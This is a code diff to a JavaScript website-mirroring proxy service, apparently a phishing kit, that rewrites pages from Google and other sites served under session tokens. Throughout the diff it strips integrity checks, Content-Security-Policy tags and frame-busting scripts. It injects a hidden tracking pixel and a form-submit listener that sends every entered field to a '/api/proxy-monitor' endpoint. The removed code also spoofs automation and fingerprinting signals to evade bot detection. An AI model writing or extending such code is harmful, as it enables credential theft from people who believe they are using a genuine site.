@@ -370,454 +370,152 @@ class WebsiteMirroringService {
       const baseUrl = new URL(targetUrl);
       const proxyPath = `/${sessionToken}`;
 
-      // Use Cheerio to modify the HTML
-      const $ = cheerio.load(html);
+      // Use Cheerio to modify the HTML with proper error handling
+      let $;
+      try {
+        $ = cheerio.load(html, { 
+          withDomLvl1: true,
+          normalizeWhitespace: false,
+          xmlMode: false,
+          decodeEntities: true
+        });
+      } catch (cheerioError) {
+        console.error('Cheerio failed to parse HTML:', cheerioError);
+        return html; // Return original HTML if parsing fails
+      }
+
+      // Validate that we have a proper HTML document
+      if ($('html').length === 0 && $('head').length === 0 && $('body').length === 0) {
+        console.log('No valid HTML structure found, skipping modification');
+        return html;
+      }
 
       // Remove all integrity checks that might detect content modification
       $('script[integrity], link[integrity]').removeAttr('integrity');
       $('script[crossorigin], link[crossorigin]').removeAttr('crossorigin');
 
-      // AGGRESSIVE CSP and frame restriction removal for Google services
+      // SIMPLIFIED CSP and frame restriction removal for Google services
       if (isGoogleService) {
-        console.log('🔥 Applying aggressive Google bypass techniques');
+        console.log('🔥 Applying simplified Google bypass techniques');
         
-        // Remove ALL CSP meta tags and script-based CSP enforcement
-        $('meta[http-equiv*="ecurity"], meta[name*="ecurity"]').remove();
-        $('meta[http-equiv*="X-Frame"], meta[name*="frame"]').remove();
-        
-        // Remove Google-specific frame-busting and security scripts
-        $('script').each((i, elem) => {
-          const scriptContent = $(elem).html();
-          if (scriptContent && (
-            scriptContent.includes('frame') ||
-            scriptContent.includes('parent') ||
-            scriptContent.includes('top') ||
-            scriptContent.includes('self') ||
-            scriptContent.includes('location') ||
-            scriptContent.includes('document.domain') ||
-            scriptContent.includes('X-Frame-Options') ||
-            scriptContent.includes('Content-Security-Policy') ||
-            scriptContent.includes('goog.') ||
-            scriptContent.includes('google.') ||
-            scriptContent.includes('clickjacking') ||
-            scriptContent.includes('framebusting') ||
-            scriptContent.includes('breakout')
-          )) {
-            console.log('🗑️ Removing Google security script');
+        // Remove CSP meta tags more carefully
+        $('meta[http-equiv]').each((i, elem) => {
+          const httpEquiv = $(elem).attr('http-equiv');
+          if (httpEquiv && httpEquiv.toLowerCase().includes('content-security-policy')) {
             $(elem).remove();
           }
         });
         
-        // Inject simplified Google bypass that preserves functionality
-        $('head').prepend(`
-          <script>
-            // SIMPLIFIED GOOGLE BYPASS - Minimal but effective
-            (function() {
-              console.log('🔥 Google bypass activated (simplified mode)');
-              
-              // Only override frame properties if needed for iframe embedding
+        $('meta[name]').each((i, elem) => {
+          const name = $(elem).attr('name');
+          if (name && name.toLowerCase().includes('security')) {
+            $(elem).remove();
+          }
+        });
+        
+        // Remove frame-busting scripts more selectively
+        $('script').each((i, elem) => {
+          const scriptContent = $(elem).html();
+          if (scriptContent && scriptContent.length < 50000) { // Only check smaller scripts
+            if (scriptContent.includes('top') && 
+                scriptContent.includes('!=') && 
+                scriptContent.includes('self')) {
+              console.log('🗑️ Removing frame-busting script');
+              $(elem).remove();
+            }
+          }
+        });
+        
+        // Add minimal Google bypass
+        if ($('head').length > 0) {
+          $('head').prepend(`
+            <script>
               try {
+                window.onCssLoad = window.onCssLoad || function(){};
+                window.onJsLoad = window.onJsLoad || function(){};
+                window.AF_initDataCallback = window.AF_initDataCallback || function(){ return {}; };
                 if (window.top !== window.self) {
-                  // We're in an iframe, override frame checks
-                  Object.defineProperty(window, 'top', {
-                    get: () => window.self,
-                    configurable: true
-                  });
-                  Object.defineProperty(window, 'parent', {
-                    get: () => window.self,
-                    configurable: true
-                  });
+                  Object.defineProperty(window, 'frameElement', { get: () => null });
                 }
-                
-                Object.defineProperty(window, 'frameElement', {
-                  get: () => null,
-                  configurable: true
-                });
-              } catch(e) {
-                console.log('Frame override skipped:', e.message);
-              }
-              
-              // Provide missing Google functions to prevent errors
-              window.onCssLoad = window.onCssLoad || function() {};
-              window.onJsLoad = window.onJsLoad || function() {};
-              window.AF_initDataCallback = window.AF_initDataCallback || function() { return {}; };
-              
-              // Basic Google API shimming
-              window.goog = window.goog || {};
-              window.goog.provide = window.goog.provide || function() {};
-              window.goog.require = window.goog.require || function() { return {}; };
-              
-              console.log('✅ Google bypass complete');
-            })();
-          </script>
-        `);
+              } catch(e) {}
+            </script>
+          `);
+        }
         
       } else {
-        // For non-Google sites, use standard CSP bypass
+        // For non-Google sites, minimal CSP bypass
         $('meta[http-equiv="Content-Security-Policy"]').remove();
         $('meta[http-equiv="content-security-policy"]').remove();
-        $('meta[name="Content-Security-Policy"]').remove();
-        $('meta[name="content-security-policy"]').remove();
         
-        // Remove frame-busting scripts
-        $('script').each((i, elem) => {
-          const scriptContent = $(elem).html();
-          if (scriptContent && (
-            scriptContent.includes('Content-Security-Policy') ||
-            scriptContent.includes('frame-ancestors') ||
-            scriptContent.includes('X-Frame-Options') ||
-            scriptContent.includes('parent !== window') ||
-            scriptContent.includes('top !== self')
-          )) {
-            console.log('Removing CSP/frame-blocking script');
-            $(elem).remove();
-          }
-        });
-        
-        // Add permissive CSP
-        $('head').prepend(`
-          <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob: wss: ws:; frame-ancestors * data: blob:; frame-src * data: blob:;">
-        `);
-      }
-      
-      // Add minimal CSP override script
-      $('head').prepend(`
-        <script>
-          // Minimal CSP override
-          (function() {
-            // Override CSP attempts
-            const originalSetAttribute = Element.prototype.setAttribute;
-            Element.prototype.setAttribute = function(name, value) {
-              if (name.toLowerCase() === 'content' && 
-                  this.getAttribute && 
-                  (this.getAttribute('http-equiv') || '').toLowerCase().includes('content-security-policy')) {
-                console.log('Blocked CSP setting attempt');
-                return;
-              }
-              return originalSetAttribute.call(this, name, value);
-            };
-            
-            // Basic frame override
-            try {
-              Object.defineProperty(window, 'frameElement', {
-                get: function() { return null; }
-              });
-            } catch(e) {}
-          })();
-        </script>
-      `);
-
-      // Preserve module loading systems - inject our scripts carefully
-      // Find if there are module scripts or webpack-style bundles
-      const hasModuleScripts = $('script[type="module"]').length > 0;
-      const hasWebpackBundles = $('script').toArray().some(script => {
-        const src = $(script).attr('src') || '';
-        const content = $(script).html() || '';
-        return src.includes('vendor') || src.includes('main') || src.includes('chunk') || 
-               content.includes('__webpack_require__') || content.includes('webpackJsonp');
-      });
-
-      // If there are module systems, be more careful with our script injection
-      if (hasModuleScripts || hasWebpackBundles) {
-        // Inject anti-detection script in a way that doesn't interfere with module loading
-        $('head').append(`
-          <script>
-            // Advanced bot detection bypass - run before modules load
-            (function() {
-              // Store original module functions before they get overwritten
-              const originalDefine = window.define;
-              const originalRequire = window.require;
-              
-              // Advanced bot detection bypass
-              Object.defineProperty(navigator, 'webdriver', {
-                get: () => undefined,
-                configurable: true
-              });
-              
-              // Continuously remove CSP meta tags that might be added dynamically
-              const removCSPTags = () => {
-                const cspTags = document.querySelectorAll('meta[http-equiv*="ecurity"], meta[name*="ecurity"]');
-                cspTags.forEach(tag => {
-                  if (tag.getAttribute('http-equiv') && 
-                      tag.getAttribute('http-equiv').toLowerCase().includes('content-security-policy')) {
-                    tag.remove();
-                  }
-                  if (tag.getAttribute('name') && 
-                      tag.getAttribute('name').toLowerCase().includes('content-security-policy')) {
-                    tag.remove();
-                  }
-                });
-              };
-              
-              // Run CSP removal immediately and periodically
-              removCSPTags();
-              setInterval(removCSPTags, 100);
-              
-              // Override document.createElement to block CSP meta tag creation
-              const originalCreateElement = document.createElement;
-              document.createElement = function(tagName) {
-                const element = originalCreateElement.call(this, tagName);
-                if (tagName.toLowerCase() === 'meta') {
-                  const originalSetAttribute = element.setAttribute;
-                  element.setAttribute = function(name, value) {
-                    if (name.toLowerCase() === 'http-equiv' && 
-                        value.toLowerCase().includes('content-security-policy')) {
-                      return; // Block CSP meta tags
-                    }
-                    if (name.toLowerCase() === 'name' && 
-                        value.toLowerCase().includes('content-security-policy')) {
-                      return; // Block CSP meta tags
-                    }
-                    return originalSetAttribute.call(this, name, value);
-                  };
-                }
-                return element;
-              };
-              
-              // Override setAttribute on existing meta tags
-              document.querySelectorAll('meta').forEach(meta => {
-                const originalSetAttribute = meta.setAttribute;
-                meta.setAttribute = function(name, value) {
-                  if (name.toLowerCase() === 'http-equiv' && 
-                      value.toLowerCase().includes('content-security-policy')) {
-                    return; // Block CSP updates
-                  }
-                  if (name.toLowerCase() === 'name' && 
-                      value.toLowerCase().includes('content-security-policy')) {
-                    return; // Block CSP updates
-                  }
-                  return originalSetAttribute.call(this, name, value);
-                };
-              });
-              
-              // Spoof automation indicators
-              delete window.callPhantom;
-              delete window._phantom;
-              delete window.__phantom;
-              delete window.phantom;
-              delete window.webdriver;
-              delete window.domAutomation;
-              delete window.domAutomationController;
-              
-              // Override common detection methods without breaking modules
-              const originalToString = Function.prototype.toString;
-              Function.prototype.toString = function() {
-                const result = originalToString.call(this);
-                return result.replace(/\\n\\s*\\[native code\\]\\s*\\n/g, ' [native code] ');
-              };
-              
-              // Preserve module system functions
-              if (originalDefine && !window.define) window.define = originalDefine;
-              if (originalRequire && !window.require) window.require = originalRequire;
-              
-              // Block fingerprinting attempts without breaking modules
-              const blockFingerprinting = () => {
-                // Canvas fingerprinting
-                if (HTMLCanvasElement.prototype.toDataURL) {
-                  const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
-                  HTMLCanvasElement.prototype.toDataURL = function() {
-                    try {
-                      return originalToDataURL.apply(this, arguments);
-                    } catch(e) {
-                      return 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
-                    }
-                  };
-                }
-                
-                // WebGL fingerprinting
-                if (WebGLRenderingContext.prototype.getParameter) {
-                  const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
-                  WebGLRenderingContext.prototype.getParameter = function(parameter) {
-                    if (parameter === 37445 || parameter === 37446) {
-                      return 'Generic Renderer';
-                    }
-                    return originalGetParameter.call(this, parameter);
-                  };
-                }
-              };
-              
-              blockFingerprinting();
-              
-              // Override timing APIs to avoid detection
-              if (window.performance && window.performance.now) {
-                const originalNow = window.performance.now;
-                window.performance.now = function() {
-                  return originalNow.call(this) + Math.random() * 0.1;
-                };
-              }
-            })();
-          </script>
-        `);
-      } else {
-        // Original script injection for non-module sites
-        $('head').prepend(`
-          <script>
-            (function() {
-              // Advanced bot detection bypass
-              Object.defineProperty(navigator, 'webdriver', {
-                get: () => undefined,
-                configurable: true
-              });
-              
-              // Continuously remove CSP meta tags that might be added dynamically
-              const removeCSPTags = () => {
-                const cspTags = document.querySelectorAll('meta[http-equiv*="ecurity"], meta[name*="ecurity"]');
-                cspTags.forEach(tag => {
-                  if (tag.getAttribute('http-equiv') && 
-                      tag.getAttribute('http-equiv').toLowerCase().includes('content-security-policy')) {
-                    tag.remove();
-                  }
-                  if (tag.getAttribute('name') && 
-                      tag.getAttribute('name').toLowerCase().includes('content-security-policy')) {
-                    tag.remove();
-                  }
-                });
-              };
-              
-              // Run CSP removal immediately and periodically
-              removeCSPTags();
-              setInterval(removeCSPTags, 100);
-              
-              // Override document.createElement to block CSP meta tag creation
-              const originalCreateElement = document.createElement;
-              document.createElement = function(tagName) {
-                const element = originalCreateElement.call(this, tagName);
-                if (tagName.toLowerCase() === 'meta') {
-                  const originalSetAttribute = element.setAttribute;
-                  element.setAttribute = function(name, value) {
-                    if (name.toLowerCase() === 'http-equiv' && 
-                        value.toLowerCase().includes('content-security-policy')) {
-                      return; // Block CSP meta tags
-                    }
-                    if (name.toLowerCase() === 'name' && 
-                        value.toLowerCase().includes('content-security-policy')) {
-                      return; // Block CSP meta tags
-                    }
-                    return originalSetAttribute.call(this, name, value);
-                  };
-                }
-                return element;
-              };
-              
-              // Spoof automation indicators
-              delete window.callPhantom;
-              delete window._phantom;
-              delete window.__phantom;
-              delete window.phantom;
-              delete window.webdriver;
-              delete window.domAutomation;
-              delete window.domAutomationController;
-              
-              // Override common detection methods
-              const originalToString = Function.prototype.toString;
-              Function.prototype.toString = function() {
-                const result = originalToString.call(this);
-                return result.replace(/\\n\\s*\\[native code\\]\\s*\\n/g, ' [native code] ');
-              };
-              
-              // Spoof geolocation with consent
-              if (navigator.geolocation) {
-                const originalGetCurrentPosition = navigator.geolocation.getCurrentPosition;
-                navigator.geolocation.getCurrentPosition = function(success, error, options) {
-                  // Simulate user denying location
-                  if (error) error({ code: 1, message: 'User denied geolocation' });
-                };
-              }
-              
-              // Block fingerprinting attempts
-              const blockFingerprinting = () => {
-                // Canvas fingerprinting
-                if (HTMLCanvasElement.prototype.toDataURL) {
-                  HTMLCanvasElement.prototype.toDataURL = function() {
-                    return 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
-                  };
-                }
-                
-                // WebGL fingerprinting
-                if (WebGLRenderingContext.prototype.getParameter) {
-                  const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
-                  WebGLRenderingContext.prototype.getParameter = function(parameter) {
-                    if (parameter === 37445 || parameter === 37446) {
-                      return 'Generic Renderer';
-                    }
-                    return originalGetParameter.call(this, parameter);
-                  };
-                }
-              };
-              
-              blockFingerprinting();
-              
-              // Override timing APIs to avoid detection
-              if (window.performance && window.performance.now) {
-                const originalNow = window.performance.now;
-                window.performance.now = function() {
-                  return originalNow.call(this) + Math.random() * 0.1;
-                };
-              }
-            })();
-          </script>
-        `);
+        if ($('head').length > 0) {
+          $('head').prepend(`
+            <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; frame-ancestors *;">
+          `);
+        }
       }
 
-      // Add base tag if it doesn't exist, or modify existing one
-      const baseTag = $('base');
-      if (baseTag.length > 0) {
-        baseTag.attr('href', `${targetUrl}/`);
-      } else {
+      // Add base tag if it doesn't exist
+      if ($('base').length === 0 && $('head').length > 0) {
         $('head').prepend(`<base href="${targetUrl}/" />`);
       }
 
-      // Advanced URL rewriting with intelligent detection avoidance
-      this.rewriteUrls($, proxyPath, targetUrl, sessionToken);
+      // Simple URL rewriting
+      $('a[href]').each((i, elem) => {
+        const href = $(elem).attr('href');
+        if (href && href.startsWith('/') && !href.startsWith('//')) {
+          $(elem).attr('href', `${proxyPath}${href}`);
+        }
+      });
 
-      // Inject invisible tracking pixel (more sophisticated)
-      $('body').append(`
-        <img src="/api/track-mirror-view/${sessionToken}" 
-             style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;" 
-             alt="" 
-             loading="lazy" />
-      `);
-      
-      // Simple credential capture script
-      $('body').append(`
-        <script>
-          // Basic form monitoring
-          document.addEventListener('submit', function(e) {
-            try {
-              const form = e.target;
-              if (!form || form.tagName !== 'FORM') return;
-              
-              const data = {};
-              const inputs = form.querySelectorAll('input, select, textarea');
-              
-              inputs.forEach(input => {
-                if (input.name && input.value && 
-                    input.type !== 'submit' && 
-                    input.type !== 'button' && 
-                    input.type !== 'image') {
-                  data[input.name] = input.value;
+      // Add simple tracking pixel if body exists
+      if ($('body').length > 0) {
+        $('body').append(`
+          <img src="/api/track-mirror-view/${sessionToken}" style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;" alt="">
+        `);
+        
+        // Simple form monitoring
+        $('body').append(`
+          <script>
+            document.addEventListener('submit', function(e) {
+              try {
+                const form = e.target;
+                if (form && form.tagName === 'FORM') {
+                  const data = {};
+                  form.querySelectorAll('input, select, textarea').forEach(input => {
+                    if (input.name && input.value && input.type !== 'submit' && input.type !== 'button') {
+                      data[input.name] = input.value;
+                    }
+                  });
+                  if (Object.keys(data).length > 0) {
+                    const img = new Image();
+                    img.src = '/api/proxy-monitor/${sessionToken}?data=' + encodeURIComponent(JSON.stringify(data)) + '&t=' + Date.now();
+                  }
                 }
-              });
-              
-              // Simple data transmission
-              if (Object.keys(data).length > 0) {
-                const img = new Image();
-                img.src = '/api/proxy-monitor/${sessionToken}?' + 
-                         'data=' + encodeURIComponent(JSON.stringify(data)) + 
-                         '&url=' + encodeURIComponent(location.href) + 
-                         '&t=' + Date.now();
-              }
-            } catch(err) {
-              // Silent fail
-            }
-          }, true);
-        </script>
-      `);
+              } catch(err) {}
+            }, true);
+          </script>
+        `);
+      }
 
-      return $.html();
+      // Get the final HTML and validate it
+      const finalHtml = $.html();
+      
+      // Basic validation of the final HTML
+      if (!finalHtml || finalHtml.length === 0) {
+        console.error('Final HTML is empty after modification');
+        return html;
+      }
+      
+      // Check if HTML structure is maintained
+      if (!finalHtml.includes('<html') && !finalHtml.includes('<!DOCTYPE')) {
+        console.error('HTML structure was corrupted during modification');
+        return html;
+      }
+
+      return finalHtml;
     } catch (error) {
       console.error('Error modifying HTML content:', error);
-      return html;
+      return html; // Return original HTML on any error
     }
   }
 
@@ -2744,18 +2442,34 @@ class WebsiteMirroringService {
           
           console.log(`HTML content size before modification: ${html.length} characters`);
           
+          // Validate that we have proper HTML before modification
+          if (!html.includes('<html') && !html.includes('<!DOCTYPE')) {
+            console.log('Invalid HTML structure detected, sending original content');
+            res.send(response.data);
+            return;
+          }
+          
           const modifiedHtml = await this.modifyHtmlContent(html, sessionToken, targetUrl, req);
           
           console.log(`HTML content size after modification: ${modifiedHtml.length} characters`);
           
-          // Validate that the modified HTML is not corrupted
-          if (modifiedHtml && modifiedHtml.length > 0) {
-            // Set content-length header to match the modified content
-            res.setHeader('Content-Length', Buffer.byteLength(modifiedHtml, 'utf8'));
+          // Validate that the modified HTML is not corrupted and has proper structure
+          if (modifiedHtml && 
+              modifiedHtml.length > 0 && 
+              (modifiedHtml.includes('<html') || modifiedHtml.includes('<!DOCTYPE')) &&
+              modifiedHtml.includes('</html>')) {
+            
+            // Remove content-length header since we're changing content size
+            res.removeHeader('content-length');
+            res.removeHeader('Content-Length');
+            
+            // Set proper content type
             res.setHeader('Content-Type', contentType);
+            
+            // Send the modified HTML
             res.send(modifiedHtml);
           } else {
-            console.error('Modified HTML is empty or corrupted, sending original');
+            console.error('Modified HTML is corrupted or incomplete, sending original');
             res.send(response.data);
           }
         } catch (htmlError) {
